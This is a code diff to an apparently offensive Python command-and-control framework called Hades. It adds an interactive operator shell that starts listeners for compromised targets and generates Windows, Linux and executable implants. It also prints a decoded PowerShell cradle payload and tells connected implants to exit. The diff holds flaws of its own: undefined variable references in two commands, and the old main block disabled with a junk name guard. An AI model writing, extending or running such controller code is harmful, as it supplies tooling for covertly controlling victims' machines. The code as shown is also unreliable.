@@ -10,8 +10,10 @@ import threading
 import time
 from datetime import datetime
 from prettytable import PrettyTable
+import cmd
 from Config.design import *
 from Config.commands import *
+
 
 
 def comm_in(targ_id):
@@ -125,7 +127,7 @@ def target_comm(targ_id, targets, num):
                 print(response)
 
 
-def listener_handler():
+def listener_handler(sock):
     """
     Handles connections and threads them
     :return:
@@ -385,10 +387,104 @@ def pshell_cradle():
     b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
     success(f"\n[+] Unencoded Payload\n\n{b64_runner_cal_decoded}")
 
+# Shell
+
+class HadesShell(cmd.Cmd):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # Target List Store
+    targets = []
+    banner()
+
+    # Count Variables
+    kill_flag = 0
+    listener_counter = 0
+
+    host_ip = ''
+    host_port = 0
+
+    prompt = Fore.LIGHTMAGENTA_EX + f"Charon@{host_ip}$ " + Style.RESET_ALL
+
+    # help command [help, h, ?]
+    def do_help(self, arg):
+        help()
+    do_h = do_help
+
+    # Clear screen command [clear, cls]
+    def do_clear(self, arg):
+        clear()
+    do_cls = do_clear
+
+    # [exit] command
+    def do_exit(self, argc):
+        quit_message = input(
+            Fore.LIGHTRED_EX + "\n[!] Are you sure you want to quit? (yes/no): " + Style.RESET_ALL).lower()
+        if quit_message == 'y' or quit_message == 'yes':
+            tar_length = len(self.targets)
+            # Delete Payloads
+            process("Deleting Payloads")
+            try:
+                if os.path.exists('Generated Payloads'):
+                    shutil.rmtree('Generated Payloads')
+            except PermissionError:
+                error("Permission Denied - Payload is still running")
+                return True
+            for target in self.targets:
+                if target[7] == 'Dead':
+                    pass
+                else:
+                    comm_out(target[0], 'exit')
+            self.kill_flag = 1
+            if self.listener_counter > 0:
+                self.sock.close()
+            quit("Quitting...")
+            return True
+        else:
+            return False
+
+    # listeners command [listeners -g' | listeners --generate]
+    def do_listeners(self, arg):
+        if arg.strip() == "-g" or arg.strip() == "--generate":
+            print("listeners")
+            self.host_ip = input(Fore.BLUE + "[i] Enter Listener IP: " + Style.RESET_ALL)
+            self.host_port = input(Fore.BLUE + "[i] Enter Listener Port: " + Style.RESET_ALL)
+            listener_handler(self.sock)
+            self.listener_counter += 1
+
+    # [pshell_shell] command 
+    def do_pshell_shell(self, arg):
+        pshell_cradle()
+
+    # [winplant.py] command
+    def do_winplant(self, arg):
+        if arg == ".py":
+            if self.listener_counter > 0:
+                winplant()
+            else:
+                error("Generate Listener First")
+
+    # [linplant.py] command
+    def do_linplant(self, arg):
+        if arg == ".py":
+            if listener_counter > 0:
+                linplant()
+            else:
+                error("Generate Listener First")
+
+    # [exeplant.py] command
+    def do_exeplant(self, arg):
+        if listener_counter > 0:
+            exeplant()
+        else:
+            error("Generate Listener First")
+
+
+
 
 # Main Function
-
 if __name__ == "__main__":
+    HadesShell().cmdloop()
+
+if __name__ == "ppppppppp":
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # Target List Store
     targets = []
